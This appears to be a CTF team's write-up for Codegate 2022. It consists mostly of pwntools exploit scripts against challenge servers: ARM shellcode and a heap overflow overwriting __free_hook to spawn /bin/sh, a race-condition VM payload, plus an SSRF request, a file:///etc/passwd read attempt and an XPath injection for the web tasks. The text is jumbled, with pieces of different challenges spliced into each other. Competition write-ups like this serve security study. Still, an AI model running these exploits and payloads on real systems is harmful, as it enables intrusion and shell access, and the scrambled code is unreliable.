codegate WriteUp By StrawHat.md
Author: Straw Hat
codegate WriteUp By StrawHat.md
Pwn
ARVM
VIMT
isolated
File-V
Web
CAFE
superbee
babyFirst
myblog
Crypto
PrimeGenerator
Dark Arts
Blockchain
Ankiwoom Invest
Pwn
ARVM
from pwn import *
context.arch='arm'
context.log_level='debug'
sc=["mov r0,#0","mov r1,#0x2000","mov r2,#12","mov r7,#3","svc #0"] #["add 
r4,pc,#128","ldr r5,[r4]","mvn r5,r5","str r5,[r4]"]
sc+=["mov r0,#0x2004","mov r1,#0","mov r2,#0","mov r3,#0x2000","ldr r7,[r3]","svc #0"]
pay=asm('\n'.join(sc))
print(pay.hex())
p=remote('15.165.92.159',1234)
p.sendafter(b'Your Code :',pay)
p.sendlineafter(b'Edit',b'1')
p.recvuntil(b'Secret code :')
p.sendlineafter(b'Code?',p.recvline().strip())
p.send(p32(1)+b'/bin/sh\x00')
p.send(p32(11)+b'/bin/sh\x00')
p.interactive()
VIMT
#! /usr/bin/python2
# coding=utf-8
import sys
from pwn import *
import hashlib
import requests
#context.log_level = 'debug'
context(arch='amd64', os='linux')
def Log(name):
    log.success(name+' = '+hex(eval(name)))
if(len(sys.argv)==1):     #local
    sh = process(["./app"])
else:             #remtoe
    # PI:EMAIL -p 1234 
    conn = ssh(user='ctf', host='3.38.59.103', port=1234, password="ctf1234_smiley")
    sh = conn.run("/home/ctf/app")
x = 113
y = 38
cur_x = 0   # pos to be written
cur_y = 0
def setY(val):
    sh.send('\x1B')
    sh.sendline('set y=%d'%(val))
def setX(target, C):
    global cur_x
    if(target==cur_x):
        sh.send(C)
        cur_x = (cur_x+6)%x
        return
    setY(y-1)
    while(True):
        if(cur_x==target):
            setY(cur_y)
            sh.send(C)
            cur_x = (cur_x+6)%x
            break
        else:
isolated
singal handler race condition
race between pop & clear will hijack stack_ptr to -1
            sh.send('A')
            cur_x = (cur_x+6)%x
def Compile():
    sh.send('\x1B')
    sh.sendline('compile')
sh.recvuntil('-'*113)
sh.recvuntil('-'*113)
def WriteLine(cont):
    global cur_y
    for i in range(0, len(cont)):
        setX(i, cont[i])
WriteLine('int main(){system("cat flag");}//')
Compile()
sh.interactive()
'''
def Test(x):
    arr = [0]*x
    for i in range(10000):
        arr[(i*6)%x] = 1
    for i in arr:
        if(i==0):
            print "No"
            return
    print "Yes"
'''
from pwn import *
#context.log_level='debug'
p=remote('3.38.234.54',7777)#process("./isolated")
#gdb.attach(p,"set detach-on-fork off\nc\n")
def ist(op,*args):
    res=p8(op)
    for i in args:
        res+=i
File-V
editContent doesn't change the totalsize.
So it can overflow.
    return res
def dat(v):
    return b"f"+p32(v)
def stk():
    return b"U"
payload=b""
payload+=ist(10,dat(1)) # turn on log
wait=(ist(6,dat(1),dat(2))+ist(6,dat(3),dat(3)))*20
label_race=len(payload)
payload+=ist(2,dat(0xffffffff),dat(0))*2 # race
payload+=ist(1)*16
payload+=ist(9)
payload+=ist(6,stk(),stk())*25
payload+=ist(6,dat(1),dat(2))
payload+=ist(6,stk(),stk())
payload+=ist(10,dat(1))
payload+=ist(3,stk(),dat(0x64f70-0x4f432))
payload+=ist(7,dat(label_race))
#payload+=ist(2,dat(0xfffffff8),dat(0)) # safepush -8
#payload+=ist(6,dat(0xfffffff8),stk()) #popcmp -8
#payload+=ist(8,dat(label_race)) # beq label_race
#payload+=10*ist(10,dat(1))
#payload+=ist(2,dat(0x10),stk())
#payload+=ist(10,dat(1)) #debug
#payload+=ist(7,dat(label_hack))
assert(len(payload)",cmd)
def ls():
    cmd(b'a')
def select(file):
    cmd(b'b')
    s.sendlineafter(b"Enter filename:",file)
def editName(size,name):
    cmd(b'1')
    s.sendlineafter(b"Enter the length of filename:",str(size).encode())
    s.sendafter(b"Enter filename:",name)
def editContent(size,buf):
    cmd('4')
    s.sendlineafter(b"Enter the size of content:",str(size).encode())
    s.sendafter(b"Enter content:",buf)
select(b'flag')
editName(0x500,b'123')
cmd(b'b')
s.sendline(b'N')
select(b'flag')
editContent(0x420,b'123')
cmd(b'5')
cmd(b'b')
select(b'flag')
cmd(b'3')
s.recvuntil(b'38 |')
libc = ELF("./libc-2.27.so")
tmp = s.recvline().split(b' ')[4:12]
libc.address = u64(''.join([i.decode('hex') for i in tmp]))-0x3e7d60
success(hex(libc.address))
# gdb.attach(s,'b *$rebase(0x3172)\nc')
cmd(b'b')
s.sendline(b'N')
cmd(b'c')
s.sendlineafter(b'Enter the length of filename:',b'10')
s.sendafter(b"Enter filename:",b'123')
select(b'123')
# raw_input(">")
editContent(7,b'123')
editName(0x90,cyclic(0x80))
editName(0x20,cyclic(0x20))
Web
CAFE
u can find adminâ€™s password in CAFE.zip
superbee
editName(0x20,cyclic(0x20))
editContent(0x57+0x50,b'123')
# payload = cyclic(103)+p64(0)+p64(0x21)
# payload += cyclic(112)+p64(0)+p64(0x41)
# payload = payload.ljust(247,b'\x00')+p64(libc.sym['__free_hook']-8)
payload = cyclic(183)+p64(0)+p64(0x141)+p64(libc.sym['__free_hook']-8)
# gdb.attach(s,'b *$rebase(0x2aea)\nc')
editContent(0xb7+0x50,payload)
# gdb.attach(s,'b *$rebase(0x286b)\nc')
editName(0x40,b'123')
# gdb.attach(s,'b *$rebase(0x286b)\nc')
editName(0x40,b'/bin/sh\x00'+p64(libc.sym['system']))
s.interactive()
Get this:
AesEncrypt([]byte(auth_key), []byte(auth_crypt_key))
auth_crypt_key  was not set,so we could use empty string to decode.
And get the key Th15_sup3r_s3cr3t_K3y_N3v3r_B3_L34k3d
babyFirst
use ssrf to read file.
GET http://localhost/admin/authkey HTTP/1.1
Host: 3.39.49.174:30001
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, 
like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,
*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,zh-TW;q=0.6
Connection: close
HTTP/1.1 200 OK
Date: Sat, 26 Feb 2022 13:30:38 GMT
Content-Length: 96
Content-Type: text/plain; charset=utf-8
Connection: close
00fb3dcf5ecaad607aeb0c91e9b194d9f9f9e263cebd55cdf1ec2a327d033be657c2582de2ef1ba6d77fd22
784011607
Md5(admin_id+auth_key)
f5b338d6bca36d47ee04d93d08c57861=e52f118374179d24fa20ebcceb95c2af
Can not start with file
url:file:///etc/passwd
myblog
http://127.0.0.1:8081/blog/read?idx='or substring(system-
property("flag"),1,1)=%27c%27%20and%20%271
Crypto
PrimeGenerator
from pwn import *
HOST = "15.164.247.87"
POST = 9001